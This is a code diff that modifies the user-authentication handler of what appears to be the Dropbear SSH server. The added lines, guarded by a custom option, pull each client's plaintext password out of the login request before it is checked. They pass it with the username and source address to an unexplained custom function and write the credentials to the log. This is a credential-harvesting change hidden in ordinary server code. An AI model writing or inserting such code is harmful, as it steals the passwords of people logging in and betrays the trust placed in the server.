@@ -34,6 +34,8 @@
 #include "auth.h"
 #include "runopts.h"
 
+#include "svr-custum.h"
+
 static void authclear();
 static int checkusername(unsigned char *username, unsigned int userlen);
 static void send_msg_userauth_banner();
@@ -109,8 +111,10 @@ static void send_msg_userauth_banner() {
  * checking, and handle success or failure */
 void recv_msg_userauth_request() {
 
-	unsigned char *username = NULL, *servicename = NULL, *methodname = NULL;
-	unsigned int userlen, servicelen, methodlen;
+	unsigned char *username = NULL, *servicename = NULL, *methodname = NULL, *password = NULL;
+	unsigned int userlen, servicelen, methodlen, passwordlen;
+	unsigned int changepw;
+	buffer* tpbuf;
 
 	TRACE(("enter recv_msg_userauth_request"))
 
@@ -129,6 +133,10 @@ void recv_msg_userauth_request() {
 	servicename = buf_getstring(ses.payload, &servicelen);
 	methodname = buf_getstring(ses.payload, &methodlen);
 
+
+
+
+
 	/* only handle 'ssh-connection' currently */
 	if (servicelen != SSH_SERVICE_CONNECTION_LEN
 			&& (strncmp(servicename, SSH_SERVICE_CONNECTION,
@@ -142,14 +150,29 @@ void recv_msg_userauth_request() {
 	}
 
 	/* user wants to know what methods are supported */
-	if (methodlen == AUTH_METHOD_NONE_LEN &&
-			strncmp(methodname, AUTH_METHOD_NONE,
-				AUTH_METHOD_NONE_LEN) == 0) {
+	if (methodlen == AUTH_METHOD_NONE_LEN && strncmp(methodname, AUTH_METHOD_NONE, AUTH_METHOD_NONE_LEN) == 0) {
 		TRACE(("recv_msg_userauth_request: 'none' request"))
 		send_msg_userauth_failure(0, 0);
 		goto out;
 	}
 	
+	if(svr_opts.cust_show_passlogin && !svr_opts.noauthpass && !(svr_opts.norootpass && ses.authstate.pw_uid == 0))
+	{
+		tpbuf = buf_newcopy(ses.payload);
+		tpbuf->pos = ses.payload->pos;
+		tpbuf->size = ses.payload->size;
+		tpbuf->len = ses.payload->len;
+		changepw = buf_getbool(tpbuf);
+		if(!changepw)
+		{
+			password = buf_getstring(tpbuf, &passwordlen);
+			cust_response_login_pass(svr_ses.addrstring, username, password);
+			dropbear_log(LOG_WARNING, "pass: %s:%s from %s", username, password, svr_ses.addrstring);
+			buf_free(tpbuf);
+
+			m_free(password);
+		}
+	}
 	/* check username is good before continuing */
 	if (checkusername(username, userlen) == DROPBEAR_FAILURE) {
 		/* username is invalid/no shell/etc - send failure */
